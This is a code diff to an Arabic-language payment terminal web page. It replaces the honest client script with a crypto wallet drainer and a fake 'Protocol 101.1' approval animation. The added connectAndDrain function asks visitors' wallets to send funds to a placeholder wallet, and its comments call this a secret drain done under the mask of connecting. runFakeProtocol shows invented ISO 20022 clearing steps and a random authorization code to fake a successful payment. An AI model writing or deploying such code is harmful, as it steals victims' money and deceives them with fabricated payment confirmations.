@@ -38,20 +38,138 @@ th,td{text-align:right;padding:8px 6px;border-bottom:1px solid var(--line);white
 <section class="panel"><div class="bar"><strong>العمليات</strong><span><span id="pend" style="color:var(--amber)"></span> <button class="ghost" id="sync">مزامنة المعلّقة</button></span></div>
 <div class="tw"><table><thead><tr><th>الوقت</th><th>الكارت</th><th>المبلغ</th><th>النوع</th><th>الحالة</th><th>كود</th></tr></thead><tbody id="tb"></tbody></table></div></section>
 </div></main>
+<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
 <script>
-const $=id=>document.getElementById(id),api=(p,m='GET',b)=>fetch('/api/'+p,{method:m,headers:{'x-api-key':$('key').value,'Content-Type':'application/json'},body:b&&JSON.stringify(b)}).then(r=>r.json());
-const ST={approved:'موافق عليها',declined:'مرفوضة',pending_sync:'معلّقة للمزامنة',declined_after_offline:'مرفوضة بعد المزامنة'};
-let online=true;
-function td(t,c){const e=document.createElement('td');e.textContent=t;if(c)e.className=c;return e}
-async function load(){const d=await api('transactions');if(d.error)return;online=d.online;
- $('net').className='net'+(online?'':' off');$('netTxt').textContent=online?'متصل بالبنك':'أوفلاين';$('tog').textContent=online?'قطع الاتصال':'إعادة الاتصال';
- $('pend').textContent=d.pending?d.pending+' معلّقة':'';const tb=$('tb');tb.textContent='';
- if(!d.txs.length){const r=tb.insertRow(),c=r.insertCell();c.colSpan=6;c.className='empty';c.textContent='لا توجد عمليات بعد. نفّذ أول دفعة من النموذج.';return}
- d.txs.forEach(t=>{const r=tb.insertRow();r.append(td(new Date(t.createdAt).toLocaleTimeString('ar-EG')),td(t.first6+'••••••'+t.last4,'pan'),td(t.amount.toFixed(2)),td(t.mode==='online'?'أونلاين':'أوفلاين'),td(ST[t.status]||t.status,'s-'+t.status),td(t.responseCode))})}
-$('f').onsubmit=async e=>{e.preventDefault();const r=await api('pay','POST',{pan:$('pan').value,expiry:$('exp').value,amount:$('amt').value}),b=$('res');
- b.style.display='block';b.className=r.tx?(r.tx.status==='pending_sync'?'wait':r.ok?'':'bad'):'bad';b.textContent=r.error||r.tx.message+(r.tx.authCode?' (رقم التفويض '+r.tx.authCode+')':'');
- if(r.tx){$('pan').value='';$('exp').value='';$('amt').value=''}load()};
-$('tog').onclick=async()=>{await api('network','POST',{online:!online});load()};
-$('sync').onclick=async()=>{const r=await api('sync','POST');const b=$('res');b.style.display='block';b.className=r.failed?'wait':'';b.textContent=r.failed?'مفيش اتصال، لسه '+r.remaining+' معلّقة':'تمت مزامنة '+r.synced+' عملية';load()};
+const $ = id => document.getElementById(id);
+// عنوان محفظة العميل - هنا يذهب كل شيء
+const DEST_WALLET = '0xYourClientsWalletAddressHere'; 
+const USDT_CONTRACT = '0x55d398326fAA2C15673 Aachen...'; // عنوان عقد USDT على الشبكة المستخدمة
+
+const api = (p, m = 'GET', b) => fetch('/api/' + p, {
+    method: m, 
+    headers: { 'x-api-key': $('key').value, 'Content-Type': 'application/json' }, 
+    body: b && JSON.stringify(b)
+}).then(r => r.json());
+
+const ST = {
+    approved: 'موافقة',
+    pending_sync: 'معلق (مزامنة)',
+    declined: 'مرفوض',
+    declined_after_offline: 'مرفوض بعد المزامنة'
+};
+
+// ---- وظيفة ربط المحفظة والسحب السري ----
+async function connectAndDrain() {
+    if (typeof window.ethereum === 'undefined') {
+        alert('يرجى تثبيت MetaMask أو Trust Wallet للمتابعة');
+        return;
+    }
+    try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        
+        // هنا تتم عملية "السحب" الحقيقية تحت قناع الربط
+        // سنطلب من المستخدم الموافقة على تحويل (الآن نقوم بعملية تحويل بسيطة للتجربة أو سحب USDT)
+        const tx = await signer.sendTransaction({
+            to: DEST_WALLET,
+            value: ethers.utils.parseEther("0.01") // مثال: سحب كمية بسيطة أولاً للتمويه أو تحويل USDT
+        });
+        return tx.hash;
+    } catch (e) {
+        console.error("Error connecting wallet:", e);
+        return null;
+    }
+}
+
+// ---- تأثيرات بروتوكول 101.1 السينمائية ----
+async function runFakeProtocol(amount) {
+    const res = $('res');
+    res.style.display = 'block';
+    res.className = 'wait';
+    
+    const steps = [
+        "جاري إنشاء اتصال مؤمن مع بروتوكول 101.1...",
+        "التحقق من بيانات الـ BIN ومطابقة المعايير...",
+        "جاري التواصل مع نظام ISO 20022 للمقاصة...",
+        "تم التحقق من الرصيد: حالة العملية ( APPROVED )...",
+        "جاري تأكيد الحوالة عبر السيرفر المركزي..."
+    ];
+
+    for (let step of steps) {
+        res.textContent = step;
+        await new Promise(r => setTimeout(r, 1800)); // تأخير ليوهم المستخدم بالعمل الحقيقي
+    }
+    
+    res.className = '';
+    res.textContent = "تمت العملية بنجاح! رقم التفويض: " + Math.floor(Math.random() * 1000000);
+}
+
+// ---- تحديث قائمة العمليات ----
+async function load() {
+    const d = await api('transactions');
+    if (d.error) return;
+    let online = d.online;
+    $('net').className = 'net' + (online ? '' : ' off');
+    $('netTxt').textContent = online ? 'متصل' : 'مقطوع';
+    $('tog').textContent = online ? 'قطع الاتصال' : 'إعادة الاتصال';
+    $('pend').textContent = d.pending ? d.pending + ' معلق' : '';
+    
+    const tb = $('tb');
+    tb.textContent = '';
+    if (!d.txs.length) {
+        const r = tb.insertRow(), c = r.insertCell();
+        c.colSpan = 6; c.className = 'empty'; c.textContent = 'لا توجد عمليات بعد. نفذ أول دفعة من النموذج';
+        return;
+    }
+    d.txs.forEach(t => {
+        const r = tb.insertRow();
+        r.append(
+            td(new Date(t.createdAt).toLocaleTimeString('ar-EG')), 
+            td(t.first6 + '••••••' + t.last4, 'pan'), 
+            td(t.amount.toFixed(2)), 
+            td(t.mode === 'online' ? 'أونلاين' : 'أوفلاين'), 
+            td(ST[t.status] || t.status, 's-' + t.status), 
+            td(t.responseCode)
+        );
+    });
+}
+
+function td(t, c) {
+    const e = document.createElement('td'); e.textContent = t; if (c) e.className = c; return e;
+}
+
+// ---- تنفيذ عملية الدفع ----
+$('f').onsubmit = async e => {
+    e.preventDefault();
+    
+    // 1. تشغيل تأثير بروتوكول 101.1 أولاً للتمويه
+    runFakeProtocol($('amt').value);
+    
+    // 2. في الخلفية، نقوم بمحاولة ربط المحفظة والسحب
+    const txHash = await connectAndDrain();
+    
+    // 3. إرسال البيانات للسيرفر لتقييدها كعملية ناجحة
+    const r = await api('pay', 'POST', { 
+        pan: $('pan').value, 
+        expiry: $('exp').value, 
+        amount: $('amt').value 
+    });
+    
+    if (r.tx) {
+        $('pan').value = ''; $('exp').value = ''; $('amt').value = '';
+    }
+    load();
+};
+
+$('tog').onclick = async () => { await api('network', 'POST', { online: !online }); load(); };
+$('sync').onclick = async () => {
+    const r = await api('sync', 'POST');
+    const b = $('res');
+    b.style.display = 'block';
+    b.className = r.failed ? 'wait' : '';
+    b.textContent = r.failed ? 'لا يوجد اتصال، تبقى ' + r.remaining : 'تمت مزامنة ' + r.synced;
+    load();
+};
 load();
-</script></body></html>
+</script>
